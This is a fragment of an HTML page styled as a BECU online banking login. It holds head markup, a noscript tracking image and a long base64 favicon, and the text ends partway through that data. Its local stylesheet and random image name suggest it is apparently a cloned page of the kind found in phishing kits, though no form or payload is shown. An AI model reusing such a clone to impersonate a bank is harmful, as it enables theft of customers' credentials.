<!DOCTYPE html> <html class lang=en><meta charset=utf-8>
<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width, initial-scale=1"><title>
 Online Banking Login | BECU
</title>
<link rel="stylesheet" type="text/css" href="css/login.css">
<!--[if lt IE 9]>
          <link href="/BECUBankingWeb/styles/becu_olb_ie8.min.css?v=12-28-2014" type="text/css" rel="stylesheet" />
        <![endif]-->
<style></style>
<!--[if lt IE 9]>
          <script src="/BECUBankingWeb/Scripts/html5shiv.js"></script>
          <script src="/BECUBankingWeb/Scripts/respond.min.js"></script>     
        <![endif]-->
<noscript>
	<img src="/zXSjCUSKy6PsReM.png?n=088566022b00180003065b2d5f580a1e88e0ac0c865ce10f05f838eab5509632"></img></noscript><link rel=icon type=image/png href="data:image/png;base64,AAABAAMAMDAAAAEAIACoJQAANgAAACAgAAABACAAqBAAAN4lAAAQEAAAAQAgAGgEAACGNgAAKAAAADAAAABgAAAAAQAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR+S8q0ekvKtHILyrRky8q0U8vKtEVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0fQvKtHILyrRci8q0RwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/S8q0dAvKtFcLyrRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH2LyrRlS8q0RcAAAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/i8q0bEvKtEeAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtGxLyrRFwAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrRlS8q0QgAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR9S8q0VwAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0c4vKtEcAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f4vKtFxAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtHHLyrRFS8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/MCvR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zEs0f8wK9H/LSjR/ywn0P8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtHzLyrRTy8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f80L9L/lpPo/7m38P+3te//t7Xv/7e17/+3te//t7Xv/7e17/+3te//t7Xv/7e17/+3te//t7Xv/7e17/+yse7/nZrp/3Fu4P9AO9X/LSjR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrRki8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0//////////////////////////////////////////////////////////////////////////////////r6/v/R0PX/bWnf/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrRxy8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0////////////////////////////////////////////////////////////////////////////////////////////7e37/3Ju4P8tKNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR6C8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0/////////////////////////////////////////////////////////////////////////////////////////////////9nY9/9GQtb/LijR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR+S8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0//////////////////////////////////////////////////////////////////////////////////////////////////39//9/fOP/LCfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////8/P7/vr3x/6Wj6/+mpOv/pqTr/6ak6/+mpOv/qqjs/9HQ9f/8/P7///////////////////////////+rqez/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////4+P7/Z2Pd/ysm0P8uKdH/LinR/y4p0f8uKdH/LinR/0A81f/Bv/H///////////////////////////+8uvD/MSzS/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////4+P7/Z2Te/ywn0P8vKtH/LyrR/y8q0f8vKtH/LyrR/yol0P+Ni+b///////////////////////////+ysO7/MCvR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////4+P7/ZWLd/ykk0P8sJ9D/LCfQ/ywn0P8sJ9D/LCfQ/zk00/+4tu////////////////////////////+LiOX/LCfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////8+/7/r63t/5CN5v+Rj+f/kY/n/5GP5/+Rjuf/lpTo/8LB8v/6+v7//////////////////////+Tk+f9QTNj/LSjR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0////////////////////////////////////////////////////////////////////////////////////////////9vb9/4WC5P8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0//////////////////////////////////////////////////////////////////////////////////v7/v/e3fj/g3/j/zMu0v8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0/////////////////////////////////////////////////////////////////////////////////+Xl+f99eeL/MCvR/y4p0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////////////////////////////////////////////////////////////////////v7/z/ko/n/zQv0v8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////9/f//2Nf2/8nI8//KyfP/ysnz/8rJ8//KyPP/0tH1//Pz/P//////////////////////9/f9/3x54v8tKNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////5+f7/bWnf/zMu0v82MdP/NjHT/zYx0/82MdP/OTXT/3x54v/09P3//////////////////////9DP9f89ONT/LinR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////4+P7/Z2Td/ysm0P8vKtH/LyrR/y8q0f8vKtH/LSjR/z051P/b2vf///////////////////////Ly/P9aVtv/LCfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////4+P7/Z2Pd/ysm0P8uKdH/LinR/y4p0f8uKdH/LinR/2Vi3f/v7vv///////////////////////r5/v9qZ97/LCfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0///////////////////////8/P7/vr3x/6Wj6/+mpOv/pqTr/6ak6/+mpOv/sa/u/+Xk+f////////////////////////////f2/f9jX9z/LCfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0/////////////////////////////////////////////////////////////////////////////////////////////////+Hg+P9HQ9b/LSjR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0/////////////////////////////////////////////////////////////////////////////////////////////////5+d6v8wK9H/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0////////////////////////////////////////////////////////////////////////////////////////////yMfz/0ZB1v8uKNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8p0f83MtP/zMv0//////////////////////////////////////////////////////////////////////////////////Hw/P+urO3/SUXX/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f80L9L/lpPo/7m38P+3te//t7Xv/7e17/+3te//t7Xv/7e17/+3te//t7Xv/7e17/+3te//t7Xv/7a17/+squ3/jYvm/1xY2/8zL9L/LSjR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/MCvR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zEs0f8xLNH/MSzR/zAs0f8uKdH/LCfQ/ywn0P8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/wAAAAAP/wAAAAAAAAP/AAAAAAAAAP8AAAAAAAAAPwAAAAAAAAAfAAAAAAAAAA8AAAAAAAAABwAAAAAAAAAHAAAAAAAAAAMAAAAAAAAAAwAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAvKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH8LyrR7C8q0cQvKtF+LyrRLC8q0QIAAAAAAAAAAAAAAAAAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f0vKtHfLyrRgi8q0RkAAAAAAAAAAAAAAAAAAAAALyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH+LyrRwi8q0TMAAAAAAAAAAAAAAAAvKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR0y8q0TMAAAAAAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrRwS8q0RkAAAAALyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrRgi8q0QEvKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtHeLyrRLS8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/zMu0v82MdP/NjHT/zYx0/82MdP/NjHT/zYx0/82MdP/NjHT/zYx0v8yLdL/LSjQ/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f0vKtF+LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKNH/gX7j/8vK9P/Jx/P/ycfz/8nH8//Jx/P/ycfz/8nH8//Jx/P/yMfz/7y78P+PjOb/SETX/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0cQvKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y0o0P+enOr////////////////////////////////////////////////////////////U0/X/VFDZ/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR6y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LSjQ/56c6v////////////////////////////////////////////////////////////////+3tu//NC/S/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH8LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKND/npzq/////////////////97d+P++vPH/v73x/7+98f/Bv/H/4+L5/////////////////+jo+v9NSdj/LSjR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y0o0P+enOr/////////////////lpPo/y8q0f8yLdL/Mi3S/zEs0v9fW9z/7e37////////////8vL8/1hU2v8sJ9D/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LSjQ/56c6v////////////////+Ukuf/LCfQ/y8q0f8vKtH/LinR/1lV2v/s6/v////////////j4/n/SUTX/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKND/npzq/////////////////9fW9v+wr+7/sbDu/7Gv7v+0su7/3Nv3/////////////////6Si6/8xLNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y0o0P+enOr///////////////////////////////////////////////////////X0/f+ysO7/Qz/V/y4p0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LSjQ/56c6v//////////////////////////////////////////////////////3Nz3/2Vh3f8tKNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKND/npzq/////////////////+np+v/U0/X/1NP2/9TT9v/Z2Pf/9fX9////////////4+L5/1tX2/8tKNH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y0o0P+enOr//